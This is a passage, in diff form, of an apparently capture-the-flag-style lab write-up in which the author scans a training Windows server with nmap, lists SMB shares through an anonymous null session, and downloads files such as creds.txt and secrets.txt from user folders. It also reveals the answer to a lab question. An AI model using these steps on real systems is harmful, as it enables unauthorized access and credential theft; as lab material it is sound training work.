@@ -655,3 +655,150 @@ drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
 I found the file named flag.txt. I then read the file using the cat command.
 
 [![Screenshot-2025-02-28-105324.png](https://i.postimg.cc/BQmPvBV6/Screenshot-2025-02-28-105324.png)](https://postimg.cc/cr8L9wZy)
+
+## Attacking Common Services - Hard
+
+The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.
+
+* **What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)**
+
+I started by doing a Nmap scan on the target machine with the following command:
+
+```bash
+ nmap -sC -sV 10.129.203.10
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 12:08 CST
+Nmap scan report for 10.129.203.10
+Host is up (0.0096s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.203.10:1433: 
+|     Target_Name: WIN-HARD
+|     NetBIOS_Domain_Name: WIN-HARD
+|     NetBIOS_Computer_Name: WIN-HARD
+|     DNS_Domain_Name: WIN-HARD
+|     DNS_Computer_Name: WIN-HARD
+|_    Product_Version: 10.0.17763
+|_ssl-date: 2025-02-28T18:11:41+00:00; +1m54s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-02-28T17:32:21
+|_Not valid after:  2055-02-28T17:32:21
+| ms-sql-info: 
+|   10.129.203.10:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-02-28T18:11:41+00:00; +1m54s from scanner time.
+| ssl-cert: Subject: commonName=WIN-HARD
+| Not valid before: 2025-02-27T17:32:10
+|_Not valid after:  2025-08-29T17:32:10
+| rdp-ntlm-info: 
+|   Target_Name: WIN-HARD
+|   NetBIOS_Domain_Name: WIN-HARD
+|   NetBIOS_Computer_Name: WIN-HARD
+|   DNS_Domain_Name: WIN-HARD
+|   DNS_Computer_Name: WIN-HARD
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-02-28T18:11:01+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 1m53s, deviation: 0s, median: 1m53s
+| smb2-time: 
+|   date: 2025-02-28T18:11:02
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.42 seconds
+```
+
+Next I tried to enumerate the shares in the SMB server with 
+```bash
+smbclient -N -L //10.129.203.10
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Home            Disk      
+	IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.203.10 failed (Error NT_STATUS_IO_TIMEOUT)
+Unable to connect with SMB1 -- no workgroup available
+```
+The Home share on the SMB server caught my attention, so I attempted to connect using a NULL session with the following command:
+```bash
+smbclient -N //10.129.203.10/Home
+```
+[![Screenshot-2025-02-28-132910.png](https://i.postimg.cc/9XSVWxd1/Screenshot-2025-02-28-132910.png)](https://postimg.cc/8shx4mnr)
+
+I proceeded with enumerating the different directories in the Home share, checking for any interesting files. As I navigated through the directories, I downloaded any files that looked relevant for further analysis.
+
+```bash
+smb: \> cd IT
+smb: \IT\> ls
+  .                                   D        0  Thu Apr 21 15:11:44 2022
+  ..                                  D        0  Thu Apr 21 15:11:44 2022
+  Fiona                               D        0  Thu Apr 21 15:11:53 2022
+  John                                D        0  Thu Apr 21 16:15:09 2022
+  Simon                               D        0  Thu Apr 21 16:16:07 2022
+
+		7706623 blocks of size 4096. 3167136 blocks available
+smb: \IT\> cd Fiona
+smb: \IT\Fiona\> ls
+  .                                   D        0  Thu Apr 21 15:11:53 2022
+  ..                                  D        0  Thu Apr 21 15:11:53 2022
+  creds.txt                           A      118  Thu Apr 21 15:13:11 2022
+
+		7706623 blocks of size 4096. 3168395 blocks available
+smb: \IT\Fiona\> get creds.txt
+getting file \IT\Fiona\creds.txt of size 118 as creds.txt (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
+smb: \IT\Fiona\> cd ..
+smb: \IT\> ls
+  .                                   D        0  Thu Apr 21 15:11:44 2022
+  ..                                  D        0  Thu Apr 21 15:11:44 2022
+  Fiona                               D        0  Thu Apr 21 15:11:53 2022
+  John                                D        0  Thu Apr 21 16:15:09 2022
+  Simon                               D        0  Thu Apr 21 16:16:07 2022
+
+		7706623 blocks of size 4096. 3168395 blocks available
+smb: \IT\> cd John
+smb: \IT\John\> ls
+  .                                   D        0  Thu Apr 21 16:15:09 2022
+  ..                                  D        0  Thu Apr 21 16:15:09 2022
+  information.txt                     A      101  Thu Apr 21 16:14:58 2022
+  notes.txt                           A      164  Thu Apr 21 16:13:40 2022
+  secrets.txt                         A       99  Thu Apr 21 16:15:55 2022
+
+		7706623 blocks of size 4096. 3168395 blocks available
+smb: \IT\John\> get information.txt
+getting file \IT\John\information.txt of size 101 as information.txt (2.8 KiloBytes/sec) (average 3.0 KiloBytes/sec)
+smb: \IT\John\> get notes.txt
+getting file \IT\John\notes.txt of size 164 as notes.txt (4.4 KiloBytes/sec) (average 3.5 KiloBytes/sec)
+smb: \IT\John\> get secrets.txt
+getting file \IT\John\secrets.txt of size 99 as secrets.txt (2.7 KiloBytes/sec) (average 3.3 KiloBytes/sec)
+smb: \IT\John\> cd..
+cd..: command not found
+smb: \IT\John\> cd ..
+smb: \IT\> cd Simon
+smb: \IT\Simon\> ls
+  .                                   D        0  Thu Apr 21 16:16:07 2022
+  ..                                  D        0  Thu Apr 21 16:16:07 2022
+  random.txt                          A       94  Thu Apr 21 16:16:48 2022
+
+		7706623 blocks of size 4096. 3168395 blocks available
+smb: \IT\Simon\> get random.txt
+getting file \IT\Simon\random.txt of size 94 as random.txt (2.6 KiloBytes/sec) (average 3.2 KiloBytes/sec)
+```
